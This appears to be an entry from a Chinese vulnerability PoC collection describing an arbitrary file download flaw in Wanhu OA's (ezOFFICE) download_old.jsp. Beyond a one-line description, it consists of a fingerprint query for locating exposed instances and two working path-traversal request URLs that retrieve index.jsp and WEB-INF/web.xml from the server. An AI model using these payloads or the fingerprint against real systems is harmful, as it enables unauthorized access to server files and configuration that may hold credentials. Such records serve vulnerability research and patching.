# 万户OA download_old.jsp 任意文件下载漏洞

## 漏洞描述

万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

<a-checkbox checked>万户OA </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="万户网络-ezOFFICE"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1631323798806-958050db-05f6-47ca-95b4-74487ee67a66-20220313174600224.png)

验证POC

```javascript
/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp
/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
```

![img](../../../.vuepress/public/img/1646041831774-193db33c-c438-459e-918a-bdae1a1a1270.png)